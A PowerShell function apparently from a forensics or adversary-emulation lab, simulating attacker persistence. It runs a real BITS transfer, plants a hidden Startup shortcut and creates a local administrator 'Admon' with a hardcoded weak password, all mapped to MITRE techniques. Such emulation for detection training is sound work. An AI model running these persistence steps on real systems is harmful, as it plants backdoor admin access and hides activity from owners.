# ============================================================================
# BLURRING THE LINES SIM - PHASE 3: PERSISTENCE
# ============================================================================
# Simulates: (1) a BITS transfer job that copies the malicious binary to
# %AppData%\Roaming\QuickAgent2\ChromeAlt_dbg.exe; (2) a Startup-folder shortcut
# ChromeAlt_dbg.lnk that re-launches the renamed EarthTime.exe on every logon;
# (3) creation of a local account "Admon" (Qwerty12345!) added to the local
# Administrators group.
# MITRE: T1197 BITS Jobs, T1547.001 Registry Run Keys / Startup Folder,
#        T1136.001 Create Account: Local Account, T1098.007 Additional Local
#        or Domain Groups
# ============================================================================

function Simulate-Persistence {
    param($SimPaths)

    Write-Host "[+] Phase 3: Persistence - BITS job, Startup .lnk, local admin account ..." -ForegroundColor Green

    # --- BITS job -> %AppData%\Roaming\QuickAgent2\ChromeAlt_dbg.exe -----------
    $quickAgent = "$env:APPDATA\QuickAgent2"
    New-Item -Path $quickAgent -ItemType Directory -Force | Out-Null
    $chromeAlt = Join-Path $quickAgent "ChromeAlt_dbg.exe"

    # Seed a benign, runnable source (the renamed EarthTime.exe from Phase 1 if
    # present, else where.exe) and move it with a REAL BITS transfer so the
    # Microsoft-BITS-Client operational log records the job (authentic T1197).
    $srcExe = "$env:USERPROFILE\Downloads\EarthTime.exe"
    if (-not (Test-Path $srcExe)) {
        $srcExe = New-RunnablePayload -Path "$($SimPaths.Payloads)\ChromeAlt_dbg_src.exe" -OverlayStrings @("QuickAgent2 persistence loader")
    }
    try {
        Import-Module BitsTransfer -ErrorAction SilentlyContinue
        Start-BitsTransfer -Source $srcExe -Destination $chromeAlt -DisplayName "QuickAgent2" -ErrorAction Stop
        Write-Host "    BITS transfer completed -> $chromeAlt" -ForegroundColor DarkGray
    } catch {
        # Fall back to bitsadmin (still logs a BITS job) then plain copy.
        try { & bitsadmin /transfer QuickAgent2 /download "$srcExe" "$chromeAlt" 2>$null | Out-Null } catch {}
        if (-not (Test-Path $chromeAlt)) { Copy-Item -Path $srcExe -Destination $chromeAlt -Force -ErrorAction SilentlyContinue }
        Write-Host "    BITS cmdlet unavailable - used bitsadmin/copy fallback -> $chromeAlt" -ForegroundColor DarkGray
    }
    Set-ArtifactTimestamp -Path $chromeAlt -Anchor $Global:BlurTimeline.Day1 -JitterMinutes 30
    Write-SimEvent -EventId 3001 -Message "SIMULATION: BITS job 'QuickAgent2' copied payload to $chromeAlt (T1197)"

    # --- Startup-folder shortcut ChromeAlt_dbg.lnk ----------------------------
    $startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    New-Item -Path $startup -ItemType Directory -Force | Out-Null
    $lnkPath = Join-Path $startup "ChromeAlt_dbg.lnk"
    try {
        $wsh = New-Object -ComObject WScript.Shell
        $sc = $wsh.CreateShortcut($lnkPath)
        $sc.TargetPath = $chromeAlt
        $sc.WorkingDirectory = $quickAgent
        $sc.WindowStyle = 7
        $sc.Description = "ChromeAlt debug helper"
        $sc.Save()
        Write-Host "    Startup persistence: $lnkPath -> $chromeAlt" -ForegroundColor DarkGray
    } catch { Write-Warning "Shortcut creation failed: $($_.Exception.Message)" }
    Set-ArtifactTimestamp -Path $lnkPath -Anchor $Global:BlurTimeline.Day1 -JitterMinutes 30
    Write-SimEvent -EventId 3002 -Message "SIMULATION: Startup shortcut ChromeAlt_dbg.lnk created for logon persistence (T1547.001)"

    # --- Local account 'Admon' + Administrators membership (real commands) -----
    $user = $Global:BlurIOCs.LocalAccountUser
    $pass = $Global:BlurIOCs.LocalAccountPass
    Write-Host "    Creating local account '$user' and adding to Administrators ..." -ForegroundColor DarkGray
    try { & net user $user $pass /add 2>$null | Out-Null } catch {}
    try { & net localgroup Administrators $user /add 2>$null | Out-Null } catch {}
    # Record exact reported command lines for the analyst
    Set-Content -Path "$($SimPaths.Logs)\account_creation.log" -Value @"
net user $user $pass /add
net localgroup Administrators $user /add
"@ -Force
    Write-SimEvent -EventId 3003 -Message "SIMULATION: local account '$user' created and added to Administrators (T1136.001/T1098.007)"

    Write-Host "  [OK] Persistence artifacts created (QuickAgent2 BITS, Startup .lnk, '$user' admin)" -ForegroundColor Yellow
}
